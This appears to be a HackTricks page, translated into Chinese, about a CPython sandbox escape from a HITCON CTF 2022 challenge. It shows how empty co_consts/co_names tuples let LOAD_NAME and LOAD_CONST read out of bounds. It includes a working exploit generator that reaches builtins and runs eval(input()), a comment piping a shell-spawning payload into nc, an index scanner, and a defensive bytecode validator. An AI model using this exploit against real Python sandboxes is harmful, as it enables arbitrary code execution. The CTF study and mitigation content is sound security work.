# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**此信息来自** [**这篇文章**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

我们可以利用 LOAD_NAME / LOAD_CONST opcode 中的 OOB 读取功能来获取内存中的某些符号。这意味着使用像 `(a, b, c, ... 数百个符号 ..., __getattribute__) if [] else [].__getattribute__(...)` 这样的技巧来获取你想要的符号（例如函数名）。

然后只需制作你的利用代码。

### Overview <a href="#overview-1" id="overview-1"></a>

源代码非常简短，仅包含 4 行！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
您可以输入任意 Python 代码，它将被编译为一个 [Python code object](https://docs.python.org/3/c-api/code.html)。但是该代码对象的 `co_consts` 和 `co_names` 在评估该代码对象之前将被替换为空元组。

因此，以这种方式，所有包含常量（例如数字、字符串等）或名称（例如变量、函数）的表达式最终可能导致段错误。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

段错误是如何发生的？

让我们从一个简单的例子开始，`[a, b, c]` 可以编译成以下字节码。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
但是如果 `co_names` 变为空元组呢？`LOAD_NAME 2` 操作码仍然会被执行，并尝试从原本应该读取的内存地址读取值。是的，这是一种越界读取的“特性”。

解决方案的核心概念很简单。在 CPython 中，一些操作码，例如 `LOAD_NAME` 和 `LOAD_CONST`，对越界读取是脆弱的（？）。

它们从 `consts` 或 `names` 元组中的索引 `oparg` 检索对象（这就是 `co_consts` 和 `co_names` 在底层的名称）。我们可以参考以下关于 `LOAD_CONST` 的简短代码片段，看看 CPython 在处理 `LOAD_CONST` 操作码时的行为。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
通过这种方式，我们可以使用 OOB 功能从任意内存偏移量获取一个“名称”。为了确保它的名称和偏移量是什么，只需不断尝试 `LOAD_NAME 0`，`LOAD_NAME 1` ... `LOAD_NAME 99` ... 你可能会在大约 oparg > 700 的地方找到一些东西。当然，你也可以尝试使用 gdb 查看内存布局，但我认为这并不会更容易？

### 生成利用代码 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

一旦我们检索到这些有用的名称/常量偏移量，我们如何从该偏移量获取名称/常量并使用它呢？这里有一个技巧：\
假设我们可以从偏移量 5 (`LOAD_NAME 5`) 获取一个 `__getattribute__` 名称，且 `co_names=()`，那么只需执行以下操作：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> 注意，命名为 `__getattribute__` 并不是必需的，你可以将其命名为更短或更奇怪的名称

你只需查看它的字节码即可理解其原因：
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
注意到 `LOAD_ATTR` 也从 `co_names` 中检索名称。Python 如果名称相同，则从相同的偏移量加载名称，因此第二个 `__getattribute__` 仍然是从 offset=5 加载的。利用这个特性，我们可以在名称附近的内存中使用任意名称。

生成数字应该是微不足道的：

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

我没有使用常量是因为长度限制。

首先，这里有一个脚本供我们查找这些名称的偏移量。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
以下内容用于生成真实的Python漏洞利用。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
它基本上执行以下操作，对于我们从 `__dir__` 方法获取的那些字符串：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 版本说明和受影响的操作码 (Python 3.11–3.13)

- CPython 字节码操作码仍然通过整数操作数索引 `co_consts` 和 `co_names` 元组。如果攻击者能够强制这些元组为空（或小于字节码使用的最大索引），解释器将为该索引读取越界内存，从附近内存中获取任意 PyObject 指针。相关操作码至少包括：
- `LOAD_CONST consti` → 读取 `co_consts[consti]`。
- `LOAD_NAME namei`，`STORE_NAME`，`DELETE_NAME`，`LOAD_GLOBAL`，`STORE_GLOBAL`，`IMPORT_NAME`，`IMPORT_FROM`，`LOAD_ATTR`，`STORE_ATTR` → 从 `co_names[...]` 读取名称（对于 3.11+ 注意 `LOAD_ATTR`/`LOAD_GLOBAL` 在低位存储标志位；实际索引为 `namei >> 1`）。有关每个版本的确切语义，请参见反汇编文档。[Python dis docs]。
- Python 3.11+ 引入了自适应/内联缓存，在指令之间添加了隐藏的 `CACHE` 条目。这并不改变 OOB 原语；这仅意味着如果你手工制作字节码，必须在构建 `co_code` 时考虑这些缓存条目。

实际影响：当你可以控制代码对象（例如，通过 `CodeType.replace(...)`）并缩小 `co_consts`/`co_names` 时，本页中的技术在 CPython 3.11、3.12 和 3.13 上继续有效。

### 用于有用 OOB 索引的快速扫描器 (3.11+/3.12+ 兼容)

如果你更喜欢直接从字节码探测有趣的对象，而不是从高级源代码，你可以生成最小代码对象并暴力破解索引。下面的助手在需要时会自动插入内联缓存。
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
笔记
- 要探测名称，请将 `LOAD_CONST` 替换为 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`，并相应调整堆栈使用。
- 如有需要，使用 `EXTENDED_ARG` 或多个字节的 `arg` 来达到索引 >255。当像上面那样使用 `dis` 构建时，您只能控制低字节；对于更大的索引，请自己构造原始字节或将攻击分成多个加载。

### 最小字节码 RCE 模式 (co_consts OOB → builtins → eval/input)

一旦您识别出解析为内置模块的 `co_consts` 索引，您可以通过操纵堆栈重构 `eval(input())`，而无需任何 `co_names`：
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
这种方法在挑战中非常有用，这些挑战让你直接控制 `co_code`，同时强制 `co_consts=()` 和 `co_names=()`（例如，BCTF 2024 “awpcode”）。它避免了源级技巧，并通过利用字节码栈操作和元组构建器来保持有效负载大小小。

### 沙箱的防御检查和缓解措施

如果你正在编写一个编译/评估不可信代码或操作代码对象的 Python “沙箱”，请不要依赖 CPython 来检查字节码使用的元组索引的边界。相反，在执行代码对象之前，请自己验证它们。

实用验证器（拒绝对 co_consts/co_names 的 OOB 访问）
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
额外的缓解措施想法
- 不要允许对不受信任的输入进行任意的 `CodeType.replace(...)`，或者对生成的代码对象添加严格的结构检查。
- 考虑在具有操作系统级沙箱（seccomp、作业对象、容器）的单独进程中运行不受信任的代码，而不是依赖于 CPython 语义。



## 参考文献

- Splitline 的 HITCON CTF 2022 文章 “V O I D”（该技术的起源和高级利用链）：https://blog.splitline.tw/hitcon-ctf-2022/
- Python 反汇编文档（LOAD_CONST/LOAD_NAME 等的索引语义，以及 3.11+ 的 `LOAD_ATTR`/`LOAD_GLOBAL` 低位标志）：https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
